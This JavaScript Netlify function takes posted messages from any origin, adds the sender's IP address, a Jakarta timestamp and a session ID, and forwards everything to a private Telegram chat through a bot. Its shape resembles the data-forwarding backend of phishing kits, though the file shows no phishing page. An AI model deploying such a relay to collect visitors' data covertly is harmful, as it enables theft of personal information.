// netlify/functions/send-data.js
exports.handler = async (event, context) => {
    const headers = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Headers': 'Content-Type',
        'Access-Control-Allow-Methods': 'POST, OPTIONS'
    };
    
    if (event.httpMethod === 'OPTIONS') {
        return { statusCode: 200, headers, body: '' };
    }
    
    if (event.httpMethod !== 'POST') {
        return { statusCode: 405, headers, body: JSON.stringify({ error: 'Method not allowed' }) };
    }
    
    try {
        const { message, type, sessionId } = JSON.parse(event.body);
        const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
        
        if (!BOT_TOKEN || !CHAT_ID) {
            console.error('Missing Telegram credentials');
            return {
                statusCode: 500,
                headers,
                body: JSON.stringify({ success: false, error: 'Server config error' })
            };
        }
        
        const clientIP = event.headers['x-forwarded-for'] || 
                         event.headers['client-ip'] || 
                         event.headers['x-real-ip'] || 
                         'Unknown';
        const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
        
        const fullMessage = `${message}
├───────────────────
├─ 🕐 WAKTU : ${timestamp}
├─ 🌐 IP : ${clientIP}
├─ 🆔 SESSION : ${sessionId || '-'}
╰───────────────────`;
        
        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const response = await fetch(telegramUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: fullMessage,
                parse_mode: 'HTML'
            })
        });
        
        const result = await response.json();
        if (!result.ok) {
            console.error('Telegram API error:', result);
            return {
                statusCode: 500,
                headers,
                body: JSON.stringify({ success: false, error: 'Telegram send failed' })
            };
        }
        
        return {
            statusCode: 200,
            headers,
            body: JSON.stringify({ success: true, message: 'Sent' })
        };
        
    } catch (error) {
        console.error('Function error:', error);
        return {
            statusCode: 500,
            headers,
            body: JSON.stringify({ success: false, error: error.message })
        };
    }
};
